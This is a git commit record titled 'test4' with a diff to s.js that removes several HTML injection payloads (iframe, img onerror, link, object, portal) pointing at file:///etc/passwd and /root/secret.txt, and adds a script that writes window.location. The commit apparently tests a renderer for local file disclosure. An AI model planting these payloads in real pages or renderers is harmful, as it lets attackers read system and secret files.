44cd19685db8e737babf24284141c04d9a01a62c
Denis Abrosimov <bggth.studio@gmail.com>
2023-07-19 20:50:49 +0300

    test4

--- s.js
+++ s.js
@@ -1,5 +1,1 @@
-<iframe src=file:///etc/passwd></iframe>
-<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-<link rel=attachment href="file:///root/secret.txt">
-<object data="file:///etc/passwd">
-<portal src="file:///etc/passwd" id=portal>
+<script> document.write(window.location) </script>
